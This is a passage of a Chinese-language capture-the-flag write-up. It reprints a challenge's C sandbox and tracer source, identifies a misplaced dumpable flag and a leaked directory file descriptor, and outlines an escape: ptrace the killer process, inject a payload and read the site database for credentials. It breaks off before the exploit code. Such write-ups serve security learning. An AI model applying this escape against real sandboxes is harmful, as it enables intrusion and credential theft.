class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mount.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/capability.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_cap_header_struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> version;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_cap_data_struct</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> effective;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> permitted;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> inheritable;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">copy</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* src, <span class="type">const</span> <span class="type">char</span>* dst)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">do_trace</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> jailsfd = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DIE(err) fprintf(stderr, err <span class="string">&quot;: (%d)\n&quot;</span>, errno); exit(-1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Take a 16 byte buffer and generate a pseudo-random UUID</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">generate_uuid</span><span class="params">(<span class="type">char</span>* buf)</span> &#123;</span><br><span class="line">    srand(time(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i+=<span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">sprintf</span>(&amp;buf[i], <span class="string">&quot;%02hhx&quot;</span>, (<span class="type">char</span>)(rand() % <span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check we have all required capabilities</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">check_caps</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_cap_header_struct</span> <span class="title">header</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_cap_data_struct</span> <span class="title">caps</span>;</span></span><br><span class="line">    <span class="type">char</span> pad[<span class="number">32</span>];</span><br><span class="line">    header.version = _LINUX_CAPABILITY_VERSION_3;</span><br><span class="line">    header.pid = <span class="number">0</span>;</span><br><span class="line">    caps.effective = caps.inheritable = caps.permitted = <span class="number">0</span>;</span><br><span class="line">    syscall(SYS_capget, &amp;header, &amp;caps);</span><br><span class="line">    <span class="keyword">if</span> (!(caps.effective &amp; <span class="number">0x2401c0</span>)) &#123;</span><br><span class="line">        DIE(<span class="string">&quot;Insufficient capabilities&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">copy_libs</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span>* libs[] = &#123;<span class="string">&quot;libc.so.6&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    <span class="type">char</span> path[FILENAME_MAX] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> outpath[FILENAME_MAX] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    system(<span class="string">&quot;mkdir -p bin usr/lib/x86_64-linux-gnu usr/lib64; cp /bin/sh bin&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; libs[i] != <span class="literal">NULL</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">sprintf</span>(path, <span class="string">&quot;/lib/x86_64-linux-gnu/%s&quot;</span>, libs[i]);</span><br><span class="line">        <span class="comment">// sprintf(path, &quot;/lib/%s&quot;, libs[i]);</span></span><br><span class="line">        <span class="built_in">sprintf</span>(outpath, <span class="string">&quot;./usr/lib/%s&quot;</span>, libs[i]);</span><br><span class="line">        copy(path, outpath);</span><br><span class="line">    &#125;</span><br><span class="line">    copy(<span class="string">&quot;/lib64/ld-linux-x86-64.so.2&quot;</span>, <span class="string">&quot;./usr/lib64/ld-linux-x86-64.so.2&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;ln -s usr/lib64 lib64; ln -s usr/lib lib; chmod 755 -R usr bin&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create PID and network namespace</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_namespaces</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWPID|CLONE_NEWNET) != <span class="number">0</span>) &#123;DIE(<span class="string">&quot;Couldn&#x27;t make namespaces&quot;</span>);&#125;;</span><br><span class="line">    <span class="comment">// Create pid-1</span></span><br><span class="line">    <span class="keyword">if</span> (fork() != <span class="number">0</span>) &#123;sleep(<span class="number">6</span>); <span class="built_in">exit</span>(<span class="number">-1</span>);&#125;</span><br><span class="line">    mkdir(<span class="string">&quot;./proc&quot;</span>, <span class="number">0555</span>);</span><br><span class="line">    mount(<span class="string">&quot;/proc&quot;</span>, <span class="string">&quot;./proc&quot;</span>, <span class="string">&quot;proc&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create our jail folder and move into it</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">make_jail</span><span class="params">(<span class="type">char</span>* name, <span class="type">char</span>* program)</span> &#123;</span><br><span class="line">    jailsfd = open(<span class="string">&quot;jails&quot;</span>, O_RDONLY|__O_DIRECTORY);</span><br><span class="line">    <span class="keyword">if</span> (faccessat(jailsfd, name, F_OK, <span class="number">0</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        DIE(<span class="string">&quot;Jail name exists&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> result = mkdirat(jailsfd, name, <span class="number">0771</span>);</span><br><span class="line">    <span class="keyword">if</span> (result == <span class="number">-1</span> &amp;&amp; errno != EEXIST) &#123;</span><br><span class="line">        DIE( <span class="string">&quot;Could not create the jail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (access(program, F_OK) != <span class="number">0</span>) &#123;</span><br><span class="line">        DIE(<span class="string">&quot;Program does not exist&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    chdir(<span class="string">&quot;jails&quot;</span>);</span><br><span class="line">    chdir(name);</span><br><span class="line">    copy_libs();</span><br><span class="line">    do_namespaces();</span><br><span class="line">    copy(program, <span class="string">&quot;./userprog&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (chroot(<span class="string">&quot;.&quot;</span>)) &#123;DIE(<span class="string">&quot;Couldn&#x27;t chroot #1&quot;</span>);&#125;</span><br><span class="line">    <span class="keyword">if</span> (setgid(<span class="number">1001</span>)) &#123;DIE(<span class="string">&quot;SGID&quot;</span>);&#125;</span><br><span class="line">    <span class="keyword">if</span> (setegid(<span class="number">1001</span>)) &#123;DIE(<span class="string">&quot;SEGID&quot;</span>);&#125;</span><br><span class="line">    <span class="keyword">if</span> (setuid(<span class="number">1001</span>)) &#123;DIE(<span class="string">&quot;SUID&quot;</span>);&#125;;</span><br><span class="line">    <span class="keyword">if</span> (seteuid(<span class="number">1001</span>)) &#123;DIE(<span class="string">&quot;SEUID&quot;</span>);&#125;;</span><br><span class="line">    do_trace();</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &lt;program&gt; [uuid]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) &gt; FILENAME_MAX - <span class="number">50</span>) &#123;</span><br><span class="line">        DIE(<span class="string">&quot;Program name too long&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((argv[<span class="number">1</span>][<span class="number">0</span>]) != <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">        DIE(<span class="string">&quot;Program path must be absolute&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    umask(<span class="number">0</span>);</span><br><span class="line">    check_caps();</span><br><span class="line">    <span class="type">int</span> result = mkdir(<span class="string">&quot;jails&quot;</span>, <span class="number">0771</span>);</span><br><span class="line">    <span class="keyword">if</span> (result == <span class="number">-1</span> &amp;&amp; errno != EEXIST) &#123;</span><br><span class="line">        DIE( <span class="string">&quot;Could not create jail directory&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> uuid[<span class="number">33</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">3</span>) &#123;</span><br><span class="line">        generate_uuid(uuid);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(uuid, argv[<span class="number">2</span>], <span class="number">32</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    uuid[<span class="number">32</span>] = <span class="number">0</span>;</span><br><span class="line">    make_jail(uuid, argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>我們可以透過作者貼心的註解快速了解裡面的功能：</p>
+<ul>
+<li>會檢查執行檔的特權是否有開 CAP_SYS_ADMIN|CAP_SYS_CHROOT|CAP_SETUID|CAP_SETGID|CAP_SETPCAP</li>
+<li>然後創建 <code>jails</code> 這個資料夾，然後在底下創建一個子目錄名稱為上傳檔案的 md5，可以從 <code>malscanner/scanner/views.py</code> 得知。</li>
+<li>使用 setegid(1001)、setuid(1001) 和 seteuid(1001)，將執行程序的進程權限降級到非特權用戶（ID 為 1001）。</li>
+<li>然後會檢查以下的項目<ul>
+<li>必須提供要執行的程序路徑（絕對路徑）。</li>
+<li>檢查程序名稱是否過長，並生成或使用 UUID 來標識該執行過程。</li>
+<li>確保工作目錄存在，否則報錯並退出。</li>
+</ul>
+</li>
+<li>沙箱中的運行程序<ul>
+<li>會創建新的 PID 和網路命名空間。</li>
+<li>將新的 &#x2F;proc 文件掛載到沙箱目錄中。</li>
+<li>然後將用戶上傳的程序複製到沙箱內的 &#x2F;userprog。</li>
+<li>移除所有進程的 capabilities，進一步降低權限。</li>
+</ul>
+</li>
+<li>執行用戶程序並記錄系統調用，會 fork 成三個進程<ul>
+<li>子進程：執行上傳的程序</li>
+<li>殺手進程（killer）：在 5 秒後終止子進程</li>
+<li>紀錄進程（logger）：記錄子進程的系統調用，便於之後分析。<br>接著我們看 tracing.c：<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/reg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/capability.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DIE(err) fprintf(stderr, err <span class="string">&quot;: (%d)\n&quot;</span>, errno); exit(-1)</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> jailsfd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_child</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">do_killer</span><span class="params">(<span class="type">int</span> pid)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">do_log</span><span class="params">(<span class="type">int</span> pid)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">log_syscall</span><span class="params">(<span class="keyword">struct</span> user_regs_struct regs, <span class="type">unsigned</span> <span class="type">long</span> ret)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_cap_header_struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> version;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_cap_data_struct</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> effective;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> permitted;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> inheritable;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_trace</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// We started with capabilities - we must reset the dumpable flag</span></span><br><span class="line">    <span class="comment">// so that the child can be traced</span></span><br><span class="line">    prctl(PR_SET_DUMPABLE, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// Remove dangerous capabilities before the child starts</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_cap_header_struct</span> <span class="title">header</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_cap_data_struct</span> <span class="title">caps</span>;</span></span><br><span class="line">    <span class="type">char</span> pad[<span class="number">32</span>];</span><br><span class="line">    header.version = _LINUX_CAPABILITY_VERSION_3;</span><br><span class="line">    header.pid = <span class="number">0</span>;</span><br><span class="line">    caps.effective = caps.inheritable = caps.permitted = <span class="number">0</span>;</span><br><span class="line">    syscall(SYS_capget, &amp;header, &amp;caps);</span><br><span class="line">    caps.effective = <span class="number">0</span>;</span><br><span class="line">    caps.permitted = <span class="number">0</span>;</span><br><span class="line">    syscall(SYS_capset, &amp;header, &amp;caps);</span><br><span class="line">    <span class="type">int</span> child = fork();</span><br><span class="line">    <span class="keyword">if</span> (child == <span class="number">-1</span>) &#123;</span><br><span class="line">        DIE(<span class="string">&quot;Couldn&#x27;t fork&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (child == <span class="number">0</span>) &#123;</span><br><span class="line">        do_child();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> killer = fork();</span><br><span class="line">    <span class="keyword">if</span> (killer == <span class="number">-1</span>) &#123;</span><br><span class="line">        DIE(<span class="string">&quot;Couldn&#x27;t fork (2)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (killer == <span class="number">0</span>) &#123;</span><br><span class="line">        do_killer(child);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        do_log(child);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_child</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// Prevent child process from escaping chroot</span></span><br><span class="line">    close(jailsfd);</span><br><span class="line">    prctl(PR_SET_PDEATHSIG, SIGHUP);</span><br><span class="line">    ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="type">char</span>* args[] = &#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(<span class="string">&quot;/userprog&quot;</span>, args, <span class="literal">NULL</span>);</span><br><span class="line">    DIE(<span class="string">&quot;Couldn&#x27;t execute user program&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_killer</span><span class="params">(<span class="type">int</span> pid)</span> &#123;</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">if</span> (kill(pid, SIGKILL) == <span class="number">-1</span>) &#123;DIE(<span class="string">&quot;Kill err&quot;</span>);&#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Killed subprocess&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_log</span><span class="params">(<span class="type">int</span> pid)</span> &#123;</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line">    waitpid(pid, &amp;status, <span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs2</span>;</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// Enter syscall</span></span><br><span class="line">        ptrace(PTRACE_SYSCALL, pid, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        waitpid(pid, &amp;status, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (WIFEXITED(status) || WIFSIGNALED(status)) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Exited&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ptrace(PTRACE_GETREGS, pid, <span class="number">0</span>, &amp;regs);</span><br><span class="line">        <span class="comment">// Continue syscall</span></span><br><span class="line">        ptrace(PTRACE_SYSCALL, pid, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        waitpid(pid, &amp;status, <span class="number">0</span>);</span><br><span class="line">        ptrace(PTRACE_GETREGS, pid, <span class="number">0</span>, &amp;regs2);</span><br><span class="line">        log_syscall(regs, regs2.rax);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((__<span class="title">packed__</span>)) &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ret;</span><br><span class="line">&#125; registers;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">log_syscall</span><span class="params">(<span class="keyword">struct</span> user_regs_struct regs, <span class="type">unsigned</span> <span class="type">long</span> ret)</span> &#123;</span><br><span class="line">    registers result;</span><br><span class="line">    result.rax = regs.orig_rax;</span><br><span class="line">    result.rdi = regs.rdi;</span><br><span class="line">    result.rsi = regs.rsi;</span><br><span class="line">    result.rdx = regs.rdx;</span><br><span class="line">    result.r10 = regs.r10;</span><br><span class="line">    result.r8 = regs.r8;</span><br><span class="line">    result.r9 = regs.r9;</span><br><span class="line">    result.ret = ret;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/log&quot;</span>, O_CREAT|O_RDWR|O_APPEND, <span class="number">0777</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    write(fd, &amp;result, <span class="keyword">sizeof</span>(registers));</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+這裡有兩個漏洞：</li>
+</ul>
+</li>
+<li>Dumpable 標誌的錯誤設定：<ul>
+<li>在 <code>do_trace()</code> 函數中，<code>prctl(PR_SET_DUMPABLE, 1)</code> 把 dumpable 的標誌設置為 1。</li>
+<li>開啟 dumpable 允許程式 traceable</li>
+<li>問題就出在他設定的時間是在 fork 之前，導致 fork 出來的三個進程都是 traceable 的，這就導致我們可以利用其他沒有受到 chroot 限制的進程來 escape。</li>
+</ul>
+</li>
+<li>未完全關閉文件描述符（File Descriptor）：<ul>
+<li>在 <code>do_child()</code> 函數中，<code>close(jailsfd)</code> 關閉了一個指向 jails 目錄的文件描述符，為了防止子進程通過文件描述符訪問沙箱外的資源。</li>
+<li>問題出在他只有在子進程關閉，killer 跟 logger 仍然是開啟的，攻擊者就可以利用他們訪問外部資源。</li>
+</ul>
+</li>
+</ul>
+<p>總結上面的描述，我們可以設計一個執行檔，執行以下的操作：</p>
+<ul>
+<li>先利用 dumpable 的漏洞<ul>
+<li>通過 ptrace 追蹤未被 chroot 限制的進程（如 killer 或 logger）。</li>
+<li>因為即使這些進程在沙箱內，它們仍然持有外部資源的文件描述符，我們可以通過這些進程訪問沙箱外部。</li>
+</ul>
+</li>
+<li>利用文件描述符 sandbox escape<ul>
+<li>我們可以透過未關閉的 jailsfd 文件描述符訪問沙箱外的文件系統。</li>
+<li>例如，我們可以讀取 &#x2F;var&#x2F;www&#x2F;malscanner&#x2F;malscanner.db 資料庫文件，提取憑證或其他敏感信息。</li>
+</ul>
+</li>
+<li>結合 PID 命名空間：<ul>
+<li>沙箱使用了 PID 命名空間，每個進程的 PID 是固定的：<ul>
+<li>PID 1: logger</li>
+<li>PID 2: child</li>
+<li>PID 3: killer</li>
+</ul>
+</li>
+<li>我們可以直接鎖定 killer 進程，注入我們的 payload 來攻擊。</li>
+</ul>
+</li>
+</ul>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>官方參考這個 <a class="link"   target="_blank" rel="noopener" href="https://github.com/earthquake/chw00t/blob/1fd1016eb957264ca45fe091c4c7e68e352fd65f/chw00t.c#L841" >repo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 寫了下面的執行檔：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span 